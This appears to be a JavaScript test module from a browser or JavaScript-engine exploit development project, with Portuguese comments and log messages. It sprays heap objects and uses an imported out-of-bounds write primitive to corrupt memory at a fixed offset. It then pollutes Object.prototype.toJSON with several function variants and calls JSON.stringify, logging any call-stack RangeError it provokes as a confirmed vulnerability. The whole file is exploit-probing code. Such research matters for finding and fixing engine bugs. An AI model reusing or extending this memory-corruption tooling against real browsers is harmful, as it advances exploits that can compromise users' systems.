// js/script3/testRevisitComplexObjectRangeError.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute, // Para ler o que escrevemos no oob_buffer
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObjectForRangeError {
    constructor(id) {
        this.id = `RangeErrorTestObj-${id}`;
        this.marker = 0x1234ABCD;
        this.data = [id, id + 1, id + 2];
        this.subObject = { nested_prop: id * 10 };
    }
    // Sem métodos para manter simples
}

// Variantes da toJSON para testar o RangeError
const toJSON_variants_for_range_error = {
    V0_EmptyReturn: function() {
        return { variant: "V0_EmptyReturn" };
    },
    V1_AccessThisId: function() {
        try { return { variant: "V1_AccessThisId", id: this.id }; }
        catch (e) { return { variant: "V1_AccessThisId", error: e.message }; }
    },
    V2_ToStringCallThis: function() {
        try { return { variant: "V2_ToStringCallThis", type: Object.prototype.toString.call(this) }; }
        catch (e) { return { variant: "V2_ToStringCallThis", error: e.message }; }
    },
    V3_LoopInLimited: function() { // O for...in que causou problema antes
        let props = {}; let count = 0;
        try {
            for (const p in this) {
                if (count++ < 5) { // Limitar iterações para evitar RangeError se for por causa do loop em si
                    if (Object.prototype.hasOwnProperty.call(this, p)) {
                        props[p] = String(this[p]).substring(0, 30);
                    }
                } else break;
            }
            return { variant: "V3_LoopInLimited", props: props, count: count };
        } catch (e) {
            return { variant: "V3_LoopInLimited", error: e.message, props_collected: props, count_at_error: count };
        }
    },
    V4_AccessMultipleProps: function() {
        try {
            return {
                variant: "V4_AccessMultipleProps",
                id: this.id,
                marker: toHex(this.marker),
                dataLength: this.data ? this.data.length : "N/A",
                subObjectProp: this.subObject ? this.subObject.nested_prop : "N/A"
            };
        } catch (e) {
            return { variant: "V4_AccessMultipleProps", error: e.message };
        }
    }
};

export async function executeRevisitComplexObjectRangeError() {
    const FNAME_TEST = "executeRevisitComplexObjectRangeError_v21";
    logS3(`--- Iniciando ${FNAME_TEST}: Revisitando RangeError com MyComplexObject ---`, "test", FNAME_TEST);

    const spray_count = 50; // Menor para logs mais gerenciáveis
    const corruption_offset_in_oob_ab = 0x70; // (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16;
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    for (const variant_name of Object.keys(toJSON_variants_for_range_error)) {
        const toJSON_function_to_use = toJSON_variants_for_range_error[variant_name];
        logS3(`\n--- SUB-TESTE: Usando ${variant_name} ---`, "subtest", FNAME_TEST);
        document.title = `RangeError Test - ${variant_name}`;

        let sprayed_objects = [];
        try {
            for (let i = 0; i < spray_count; i++) {
                sprayed_objects.push(new MyComplexObjectForRangeError(i));
            }
        } catch (e_spray) {
            logS3(`ERRO no spray para ${variant_name}: ${e_spray.message}`, "error", FNAME_TEST);
            continue;
        }

        await triggerOOB_primitive();
        if (!oob_array_buffer_real) {
            logS3("Falha OOB Setup. Pulando sub-teste.", "error", FNAME_TEST);
            continue;
        }

        try {
            logS3(`  Escrevendo ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "warn", FNAME_TEST);
            oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        } catch (e_write) {
            logS3(`  ERRO na escrita OOB para ${variant_name}: ${e_write.message}`, "error", FNAME_TEST);
            clearOOBEnvironment();
            continue;
        }

        await PAUSE_S3(100);

        const ppKey_val = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        let pollutionApplied = false;
        let rangeErrorOccurred = false;
        let otherErrorOccurred = null;

        try {
            Object.defineProperty(Object.prototype, ppKey_val, {
                value: toJSON_function_to_use,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;

            // Testar apenas o primeiro objeto pulverizado
            const target_obj_to_stringify = sprayed_objects[0];
            if (target_obj_to_stringify) {
                logS3(`  Chamando JSON.stringify(sprayed_objects[0]) (ID: ${target_obj_to_stringify.id}) com ${variant_name}...`, "info", FNAME_TEST);
                let stringify_result = JSON.stringify(target_obj_to_stringify);
                logS3(`    JSON.stringify completou. Resultado da toJSON: ${JSON.stringify(stringify_result)}`, "info", FNAME_TEST);
                if (stringify_result && stringify_result.error) {
                    otherErrorOccurred = `Erro interno da toJSON: ${stringify_result.error}`;
                }
            } else {
                logS3("  Nenhum objeto pulverizado para testar.", "warn", FNAME_TEST);
            }

        } catch (e_str) {
            if (e_str.name === 'RangeError' && e_str.message.toLowerCase().includes('call stack')) {
                rangeErrorOccurred = true;
                logS3(`    !!!! RangeError: Maximum call stack size exceeded CAPTURADO com ${variant_name} !!!!`, "critical", FNAME_TEST);
                document.title = `RangeError with ${variant_name}!`;
            } else {
                otherErrorOccurred = `${e_str.name}: ${e_str.message}`;
                logS3(`    !!!! ERRO INESPERADO em JSON.stringify com ${variant_name}: ${otherErrorOccurred} !!!!`, "critical", FNAME_TEST);
                document.title = `Error with ${variant_name}!`;
            }
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
                else delete Object.prototype.toJSON;
            }
        }

        if (rangeErrorOccurred) {
            logS3(`  ---> ${variant_name}: CONFIRMADO RangeError.`, "vuln", FNAME_TEST);
        } else if (otherErrorOccurred) {
            logS3(`  ---> ${variant_name}: Outro erro ocorreu: ${otherErrorOccurred}.`, "error", FNAME_TEST);
        } else {
            logS3(`  ---> ${variant_name}: Completou sem RangeError.`, "good", FNAME_TEST);
        }

        clearOOBEnvironment();
        sprayed_objects.length = 0;
        await PAUSE_S3(MEDIUM_PAUSE_S3);
        if (rangeErrorOccurred && variant_name === "V3_LoopInLimited") {
            logS3("RangeError com V3_LoopInLimited (for...in) é o esperado de logs anteriores. Investigar se outras variantes também causam.", "info", FNAME_TEST);
        }
    } // Fim do loop de variantes toJSON

    globalThis.gc?.();
    logS3(`--- ${FNAME_TEST} Concluído ---`, "test", FNAME_TEST);
}
